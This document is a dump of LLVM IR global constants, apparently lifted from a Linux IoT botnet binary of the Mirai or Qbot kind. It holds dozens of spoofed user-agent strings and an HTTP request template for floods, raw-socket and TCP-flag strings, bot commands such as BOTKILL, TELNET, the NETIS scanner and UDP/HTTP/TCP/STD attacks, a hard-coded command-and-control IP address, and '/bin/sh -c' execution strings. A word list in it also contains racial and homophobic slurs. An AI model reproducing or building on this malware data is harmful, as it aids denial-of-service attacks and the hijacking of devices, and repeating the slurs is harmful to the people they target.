@global_var_8059738.318 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_80597c8.319 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_8059800.320 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_8059820.321 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_8059838.322 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_8059890.323 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_8059930.324 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_8059984.325 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_80599f8.326 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_8059a38.327 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_8059af0.328 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_8059b44.329 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_8059b9c.330 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_8059bf4.331 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_8059c34.332 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_8059c7c.333 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_8059cd4.334 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_8059d40.335 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_8059d98.336 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_8059de8.337 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_8059e0c.338 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_8059e67.339 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_8059e78.340 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_8059ea8.341 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_8059ecc.342 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_8059eee.343 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_8059f08.344 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8059f48.345 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_8059fd4.346 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a01c.347 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a064.348 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a0ac.349 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a0f4.350 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_805a148.351 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_805a198.352 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_805a204.353 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_805a258.354 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_805a2b4.355 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_805a310.356 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_805a374.357 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_805a3d0.358 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805a42c.359 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805a488.360 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805a4e8.361 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_805a530.362 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_805a5c8.363 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_805a614.364 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805a660.365 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_805a6b0.366 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_805a6f8.367 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_805a74c.368 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_805a79c.369 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_805a7e4.370 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_805a830.371 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805a87c.372 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_805a8c4.373 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805a914.374 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805a964.375 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805a998.376 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805a9cc.377 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_805aa20.378 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_80596b8.316, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_80596f8.317, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_8059738.318, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_80597c8.319, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_8059800.320, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8059820.321, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_8059838.322, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_8059890.323, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_8059930.324, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_8059984.325, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_80599f8.326, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_8059a38.327, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_8059af0.328, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8059b44.329, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8059b9c.330, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8059bf4.331, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_8059c34.332, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8059c7c.333, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_8059cd4.334, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_8059d40.335, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_8059d98.336, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_8059de8.337, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_8059e0c.338, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059e67.339, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_8059e78.340, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_8059ea8.341, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_8059ecc.342, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_8059eee.343, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_8059f08.344, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_8059f48.345, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_8059fd4.346, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805a01c.347, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805a064.348, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805a0ac.349, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_805a0f4.350, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_805a148.351, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_805a198.352, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_805a204.353, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805a258.354, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805a2b4.355, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_805a310.356, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805a374.357, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805a3d0.358, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805a42c.359, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_805a488.360, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805a4e8.361, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_805a530.362, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805a5c8.363, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805a614.364, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_805a660.365, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805a6b0.366, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_805a6f8.367, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_805a74c.368, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_805a79c.369, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805a7e4.370, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805a830.371, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805a87c.372, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805a8c4.373, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805a914.374, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_805a964.375, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_805a998.376, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_805a9cc.377, i32 0, i32 0)]
@global_var_805ab30.382 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_805ab6e.383 = constant [6 x i8] c"arfgG\00"
@global_var_805ab74.384 = constant [9 x i8] c"HBiug655\00"
@global_var_805ab7d.385 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_805ab8a.386 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_805ab9e.387 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_805abaf.388 = constant [12 x i8] c"GJjyur67458\00"
@global_var_805abbb.389 = constant [12 x i8] c"RYSDk747586\00"
@global_var_805abc7.390 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_805abd3.391 = constant [10 x i8] c"KHGK7985i\00"
@global_var_805abdd.392 = constant [11 x i8] c"yuituiILYF\00"
@global_var_805abe8.393 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_805abf6.394 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_805ac02.395 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_805ac0f.396 = constant [9 x i8] c"ewqdcftr\00"
@global_var_805ac18.397 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_805ac28.398 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_805ac33.399 = constant [12 x i8] c"twehgbferhb\00"
@global_var_805ac3f.400 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_805ac4b.401 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_805ac59.402 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_805ac67.403 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_805ac75.404 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_805ac7f.405 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_805ac8d.406 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_805ac9b.407 = constant [12 x i8] c"yteytietyue\00"
@global_var_805aca7.408 = constant [9 x i8] c"qsortEQS\00"
@global_var_805acb0.409 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805acc0.410 = constant [4 x i8] c"std\00"
@global_var_805acc4.411 = constant [4 x i8] c"dts\00"
@global_var_805acc8.412 = constant [6 x i8] c"hackz\00"
@global_var_805acce.413 = constant [7 x i8] c"shdyed\00"
@global_var_805acd5.414 = constant [5 x i8] c"http\00"
@global_var_805acda.415 = constant [10 x i8] c"sghwiondc\00"
@global_var_805ace4.416 = constant [7 x i8] c"nigger\00"
@global_var_805aceb.417 = constant [6 x i8] c"pussy\00"
@global_var_805acf1.418 = constant [7 x i8] c"faggot\00"
@global_var_805ad00.419 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805ab6e.383, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805ab74.384, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805ab7d.385, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805ab8a.386, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805ab9e.387, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805abaf.388, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805abbb.389, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805abc7.390, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805abd3.391, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805abdd.392, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805abe8.393, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805abf6.394, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805ac02.395, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805ac0f.396, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805ac18.397, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805ac28.398, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805ac33.399, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805ac3f.400, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805ac4b.401, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805ac59.402, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805ac67.403, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805ac75.404, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805ac7f.405, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805ac8d.406, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805ac9b.407, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805aca7.408, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805acb0.409, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805acc0.410, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805acc4.411, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805acc8.412, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805acce.413, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805acd5.414, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805acda.415, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805ace4.416, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aceb.417, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805acf1.418, i32 0, i32 0)]
@global_var_805ad90.420 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805adac.421 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_805adcd.422 = constant [4 x i8] c"all\00"
@global_var_805add1.423 = constant i32 2037579820
@global_var_805add3.424 = constant [4 x i8] c"syn\00"
@global_var_805add7.425 = constant [4 x i8] c"rst\00"
@global_var_805addb.426 = constant [4 x i8] c"fin\00"
@global_var_805addf.427 = constant [4 x i8] c"ack\00"
@global_var_805ade3.428 = constant [4 x i8] c"psh\00"
@global_var_805ade7.429 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_805adf9.430 = constant [6 x i8] c"PONG!\00"
@global_var_805adff.431 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_805ae0a.432 = constant [10 x i8] c"My IP: %s\00"
@global_var_805ae14.433 = constant [8 x i8] c"BOTKILL\00"
@global_var_805ae1c.434 = constant [13 x i8] c"Killing Bots\00"
@global_var_805ae29.435 = constant [7 x i8] c"LOOPME\00"
@global_var_805ae30.436 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_805ae40.437 = constant [7 x i8] c"TELNET\00"
@global_var_805ae47.438 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_805ae57.439 = constant [4 x i8] c"OFF\00"
@global_var_8063710.440 = local_unnamed_addr global i32 0
@global_var_805ae5b.441 = constant [5 x i8] c" OFF\00"
@global_var_805ae60.442 = constant [3 x i8] c"ON\00"
@global_var_805ae63.443 = constant [6 x i8] c"NETIS\00"
@global_var_805ae69.444 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_805ae82.445 = constant [5 x i8] c"HOLD\00"
@global_var_805ae87.446 = constant [5 x i8] c"JUNK\00"
@global_var_805ae8c.447 = constant [4 x i8] c"UDP\00"
@global_var_805ae90.448 = constant [5 x i8] c"HTTP\00"
@global_var_805ae95.449 = constant [4 x i8] c"CNC\00"
@global_var_805ae99.450 = constant [6 x i8] c"COMBO\00"
@global_var_805ae9f.451 = constant [4 x i8] c"STD\00"
@global_var_805aea3.452 = constant [4 x i8] c"TCP\00"
@global_var_805aea7.453 = constant [5 x i8] c"STOP\00"
@global_var_805aeac.454 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_805d0f0.455 = local_unnamed_addr global i32 -1
@global_var_8057fa0.456 = constant [16 x i8] c"188.213.170.176\00"
@global_var_805d040.457 = global [16 x i8]* @global_var_8057fa0.456
@global_var_805d044.458 = local_unnamed_addr global i32 47
@global_var_805aeb8.459 = constant [8 x i8] c"8.8.8.8\00"
@global_var_805aec0.460 = constant [16 x i8] c"/proc/net/route\00"
@global_var_805aed0.461 = constant [11 x i8] c"\0900000000\09\00"
@global_var_805aedb.463 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_805aeeb.464 = constant [7 x i8] c"SERVER\00"
@global_var_805aef2.465 = constant [7 x i8] c"ROUTER\00"
@global_var_805aefa.467 = constant [5 x i8] c"sshd\00"
@global_var_805aeff.468 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_805d0ec.469 = local_unnamed_addr global i32 1
@global_var_805af12.470 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_805af1f.471 = constant i32 1867251759
@global_var_805af21.472 = constant [8 x i8] c"Love <3\00"
@global_var_805af2c.473 = constant i32 993090331
@global_var_805af6e.474 = constant [5 x i8] c"PONG\00"
@global_var_805af73.475 = constant [4 x i8] c"DUP\00"
@global_var_805af77.476 = constant [5 x i8] c"MOVE\00"
@global_var_805af7c.477 = constant [8 x i8] c"%s 2>&1\00"
@global_var_805af84.478 = constant i32 2097266
@global_var_805af86.479 = constant i32 32
@global_var_805d1e8 = external local_unnamed_addr global i32
@global_var_805d240.482 = global i32 288
@global_var_805d290.483 = local_unnamed_addr global i32 272
@global_var_80636e0.485 = global i32 0
@global_var_805b5a0.486 = constant i32 0
@global_var_805d20c.487 = global i32 0
@global_var_805d224.488 = global i32 0
@global_var_805d208.489 = global i32* @global_var_805d240.482
@global_var_805b5b8.490 = constant [6 x i8] c"(nil)\00"
@global_var_805b5be.491 = constant [7 x i8] c"(null)\00"
@global_var_805b5c5.492 = constant i32 2949163
@global_var_805b632.494 = constant i32 327688
@global_var_805b62a.495 = constant [8 x i8] c" +0-#'I\00"
@global_var_805b5d8.496 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805b615.497 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805b60b.498 = constant i32 117506048
@global_var_805b5fc.499 = constant i32 331776
@global_var_805b680.500 = constant [8 x i8] c"Success\00"
@global_var_805b656.501 = constant [15 x i8] c"Unknown error \00"
@global_var_805c620.502 = constant i32 65536
@global_var_805d440.503 = local_unnamed_addr global i32* @global_var_805c620.502
@global_var_80634c0.504 = global i32 0
@global_var_805c25c.505 = constant [15 x i8] c"Resolver error\00"
@global_var_805c1e2.506 = constant [8 x i8] c"Error 0\00"
@global_var_805c1ea.507 = constant [13 x i8] c"Unknown host\00"
@global_var_805c1f7.508 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_805c210.509 = constant [21 x i8] c"Unknown server error\00"
@global_var_805c225.510 = constant [32 x i8] c"No address associated with name\00"
@global_var_805c248.511 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805c1e2.506, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805c1ea.507, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_805c1f7.508, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805c210.509, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805c225.510, i32 0, i32 0)]
@global_var_805c26b.512 = constant [3 x i8] c": \00"
@global_var_805c26d.513 = constant i32 0
@global_var_805c1da.514 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_80634c4.515 = global i32 0
@global_var_80634e0.516 = global i32 0
@global_var_80636ac.517 = global i32 0
@global_var_805d448.518 = global i32 0
@global_var_8063b34.519 = local_unnamed_addr global i32 0
@global_var_8063b28.520 = global i32 0
@global_var_8063720.521 = global i32 0
@global_var_805d330.522 = global i32 0
@global_var_80637cc.524 = global i32 0
@global_var_80637d0.525 = local_unnamed_addr global i32 0
@global_var_80637d4.526 = global i32 0
@global_var_80637e0.527 = local_unnamed_addr global i32 0
@global_var_8063ad4.528 = global i32 0
@global_var_8063afc.529 = local_unnamed_addr global i32 0
@global_var_8063aec.530 = local_unnamed_addr global i32 0
@global_var_8063af0.531 = local_unnamed_addr global i32 0
@global_var_8063af4.532 = local_unnamed_addr global i32 0
@global_var_8063af8.533 = local_unnamed_addr global i32 0
@global_var_8063b04.534 = local_unnamed_addr global i32 0
@global_var_8063b10.535 = local_unnamed_addr global i32 0
@global_var_8063b08.536 = local_unnamed_addr global i32 0
@global_var_8063b14.537 = local_unnamed_addr global i32 0
@global_var_8063ae8.538 = local_unnamed_addr global i32 0
@global_var_8063ae4.540 = local_unnamed_addr global i32 0
@global_var_8063b0c.541 = local_unnamed_addr global i32 0
@global_var_80637dc.542 = local_unnamed_addr global i32 0
@global_var_805d348.543 = global i32 0
@global_var_805d360.545 = global i32 0
@global_var_805d378 = external global i32
@global_var_805d3a4.547 = global i32 -1726662223
@global_var_805d380.548 = local_unnamed_addr global i32* @global_var_805d3a4.547
@global_var_805d37c.549 = global i32* @global_var_805d3a4.547
@global_var_805c294.550 = constant i32 0
@global_var_805c280.551 = constant i32 0
@global_var_805c2a8.552 = constant [3 x i8] c"-c\00"
@global_var_805c2b0.553 = constant [3 x i8] c"sh\00"
@global_var_805c2ab.554 = constant [8 x i8] c"/bin/sh\00"
@global_var_805d420.555 = global i32 0
@global_var_80636c4.556 = local_unnamed_addr global i32 0
@global_var_80636cc.557 = local_unnamed_addr global i32 0
@global_var_805d000.559 = global i32 -1
@global_var_8054a47.560 = constant i32 -294069
